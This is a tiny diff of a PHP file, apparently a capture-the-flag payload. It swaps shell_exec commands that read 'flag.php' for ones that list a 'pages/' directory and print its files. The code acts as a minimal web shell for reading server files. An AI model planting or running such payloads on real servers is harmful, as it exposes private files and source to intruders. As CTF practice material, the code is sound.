@@ -1,6 +1,6 @@
 <?php
 
-echo(shell_exec("ls"));
-echo(shell_exec("cat flag.php"));
+echo(shell_exec("ls pages/."));
+echo(shell_exec("cat pages/* | grep -v php"));
 
 ?>
